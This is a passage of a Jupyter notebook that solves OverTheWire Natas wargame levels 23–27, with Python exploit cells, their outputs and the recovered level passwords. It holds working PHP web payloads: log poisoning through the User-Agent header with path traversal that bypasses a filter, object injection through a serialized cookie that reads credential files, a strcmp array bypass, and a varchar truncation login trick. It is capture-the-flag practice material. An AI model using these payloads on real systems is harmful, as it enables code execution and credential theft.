       "<br>The credentials for the next level are:<br><pre>Username: natas24 Password: OsRmXFguozKpTZZ5X14zNO43379LZveg</pre>  \n",
       "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
       "</div>\n",
       "</body>\n",
       "</html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "'OsRmXFguozKpTZZ5X14zNO43379LZveg'"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas23')\n",
    "def natas23():\n",
    "    reply = natas.readall('?passwd=11iloveyou')\n",
    "    \n",
    "    display(HTML(reply))\n",
    "    \n",
    "    flag = Natas.grep_flag(reply)[-1]\n",
    "    return flag\n",
    "    \n",
    "natas23()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas 24\n",
    "http://natas24.natas.labs.overthewire.org/\n",
    "\n",
    "- strcmp($array[], 'anything') = NULL + warning\n",
    "- idea: send passwd[] variable instead of passwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<html>\n",
       "<head>\n",
       "<!-- This stuff in the header has nothing to do with the level -->\n",
       "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
       "<script src=\"http://natas.labs.overthewire.org/js/wechall-data.js\"></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
       "<script>var wechallinfo = { \"level\": \"natas24\", \"pass\": \"OsRmXFguozKpTZZ5X14zNO43379LZveg\" };</script></head>\n",
       "<body>\n",
       "<h1>natas24</h1>\n",
       "<div id=\"content\">\n",
       "\n",
       "Password:\n",
       "<form name=\"input\" method=\"get\">\n",
       "    <input type=\"text\" name=\"passwd\" size=20>\n",
       "    <input type=\"submit\" value=\"Login\">\n",
       "</form>\n",
       "\n",
       "<br />\n",
       "<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/natas/natas24/index.php</b> on line <b>23</b><br />\n",
       "<br>The credentials for the next level are:<br><pre>Username: natas25 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c</pre>  \n",
       "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
       "</div>\n",
       "</body>\n",
       "</html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "'GHF6X7YwACaYYssHVY05cFq83hRktl4c'"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas24')\n",
    "def natas24():\n",
    "    reply = natas.readall('?passwd[]')\n",
    "    \n",
    "    display(HTML(reply))\n",
    "    \n",
    "    flag = Natas.grep_flag(reply)[-1]\n",
    "    return flag\n",
    "\n",
    "natas24()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas 25\n",
    "http://natas25.natas.labs.overthewire.org/\n",
    "\n",
    "- page makes an include depending on a request variable: _languages/$lang_\n",
    "- include is secured with _str\\_replace(\"../\", \"\")_ and also prevents inclusion of paths containing _natas\\_webpass_\n",
    "- logs useragent into /var/www/natas/natas25/logs/natas25_SESSIONID.log\n",
    "- idea: use _str\\_replace(\"..././\", \"\")_ = \"../\" to include the log file\n",
    "- inject php code into the log file"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "rptbie4lta1bf434rssdff1p60\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<html>\n",
       "<head>\n",
       "<!-- This stuff in the header has nothing to do with the level -->\n",
       "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
       "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
       "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
       "<script src=\"http://natas.labs.overthewire.org/js/wechall-data.js\"></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
       "<script>var wechallinfo = { \"level\": \"natas25\", \"pass\": \"GHF6X7YwACaYYssHVY05cFq83hRktl4c\" };</script></head>\n",
       "<body>\n",
       "\n",
       "<h1>natas25</h1>\n",
       "<div id=\"content\">\n",
       "<div align=\"right\">\n",
       "<form>\n",
       "<select name='lang' onchange='this.form.submit()'>\n",
       "<option>language</option>\n",
       "<option>en</option><option>de</option></select>\n",
       "</form>\n",
       "</div>\n",
       "\n",
       "[23.09.2019 14::16:09] oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T\n",
       " \"Directory traversal attempt! fixing request.\"\n",
       "<br />\n",
       "<b>Notice</b>:  Undefined variable: __GREETING in <b>/var/www/natas/natas25/index.php</b> on line <b>80</b><br />\n",
       "<h2></h2><br />\n",
       "<b>Notice</b>:  Undefined variable: __MSG in <b>/var/www/natas/natas25/index.php</b> on line <b>81</b><br />\n",
       "<p align=\"justify\"><br />\n",
       "<b>Notice</b>:  Undefined variable: __FOOTER in <b>/var/www/natas/natas25/index.php</b> on line <b>82</b><br />\n",
       "<div align=\"right\"><h6></h6><div><p>\n",
       "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
       "</div>\n",
       "</body>\n",
       "</html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas25')\n",
    "def natas25():\n",
    "    response = natas.urlopen()\n",
    "    cookie = response.getheader('Set-Cookie').split(';')[0]\n",
    "    sessionid = cookie.replace('PHPSESSID=', '')\n",
    "    \n",
    "    print(sessionid)\n",
    "    \n",
    "    request = natas.get_request('?lang=..././logs/natas25_' + sessionid + '.log')\n",
    "    request.add_header('Cookie', cookie)\n",
    "    request.add_header('User-Agent', '<?php readfile(\"/etc/natas_webpass/natas26\") ?>')\n",
    "    reply = natas.readall(request)\n",
    "    \n",
    "    display(HTML(reply))\n",
    "    \n",
    "    flag = Natas.grep_flag(reply)[-1]\n",
    "    return flag\n",
    "\n",
    "natas25()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas 26\n",
    "http://natas26.natas.labs.overthewire.org/\n",
    "\n",
    "- the page contains an unused _Logger_ class\n",
    "- uses _unserialize_ to extract image data from the cookie\n",
    "- idea: construct a logger with a special _$exitMsg_ into the cookie and serialize it:\n",
    "\n",
    "```php\n",
    "<?php\n",
    "\n",
    "class Logger {\n",
    "        private $logFile;\n",
    "        private $initMsg;\n",
    "        private $exitMsg;\n",
    "\n",
    "        function __construct() {\n",
    "                $this->logFile = \"img/natas26.php\";\n",
    "                $this->exitMsg = \"<?php readfile('/etc/natas_webpass/natas27'); ?>\";\n",
    "        }\n",
    "}\n",
    "\n",
    "$logger = new Logger();\n",
    "print(urlencode(base64_encode(serialize($logger))));\n",
    "\n",
    "?>```\n",
    "- serialized form:\n",
    "```\n",
    "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNToiaW1nL25hdGFzMjYucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO047czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjQ4OiI8P3BocCByZWFkZmlsZSgnL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30%3D```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PHPSESSID=oj2ln5v11vrvk066km71njomh6\n",
      "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNToiaW1nL25hdGFzMjYucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO047czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjQ4OiI8P3BocCByZWFkZmlsZSgnL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30%3D\n",
      "drawing=Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNToiaW1nL25hdGFzMjYucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO047czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjQ4OiI8P3BocCByZWFkZmlsZSgnL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30%3D\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ'"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas26')\n",
    "def natas26():\n",
    "    response = natas.urlopen()\n",
    "    session_cookie = response.getheader('Set-Cookie').split(';')[0]\n",
    "    session_id = session_cookie.replace('PHPSESSID=', '')\n",
    "    \n",
    "    print(session_cookie)\n",
    "    \n",
    "    serialized_logger = 'Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNToiaW1nL25hdGFzMjYucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO047czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjQ4OiI8P3BocCByZWFkZmlsZSgnL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30%3D'\n",
    "    cookie = \"drawing=\" + serialized_logger\n",
    "    \n",
    "    print(serialized_logger)\n",
    "    print(cookie)\n",
    "    \n",
    "    request = natas.get_request()\n",
    "    request.add_header('Cookie', session_cookie + '; ' + cookie)\n",
    "    natas.readall(request)\n",
    "    \n",
    "    reply = natas.readall('img/natas26.php')\n",
    "    \n",
    "    flag = Natas.grep_flag(reply)[-1]\n",
    "    return flag\n",
    "\n",
    "natas26()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## natas 27\n",
    "http://natas27.natas.labs.overthewire.org/\n",
    "\n",
    "- SQL table uses varchar(64) instead of nvarchar(64) type \\\n",
    "-> 'natas28' and 'natas28[fill up with spaces until 64 chars]1' cannot be distringuished in SELECT statements\n",
    "- login as 'natas28[57 white spaces]' to create user with empty password\n",
    "- login again as 'natas28' and gain flag"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'JWwR438wkgTsNKBbcJoowyysdM82YjeF'"
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "@NatasLevel('natas27')\n",
    "def natas27():\n",
    "    username = 'natas28'\n",
    "    username += ' ' * (64 - len(username)) + '1'\n",
    "\n",
    "    # login as 'natas28                                                         1'\n",
    "    # to create new user with empty password\n",
    "    request = natas.get_request(method='POST')\n",
    "    request.data = urlencode({'username': username, 'password': '', 'submit': 'login'}).encode()\n",
    "    natas.urlopen(request)\n",
    "    \n",
    "    # login as 'natas28' to gain flag\n",
    "    request = natas.get_request(method='POST')\n",
    "    request.data = urlencode({'username': 'natas28', 'password': '', 'submit': 'login'}).encode()\n",
    "    reply = natas.readall(request)\n",
    "\n",
    "    flag = Natas.grep_flag(reply)[-1]\n",
    "    return flag\n",
    "\n",
    "natas27()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
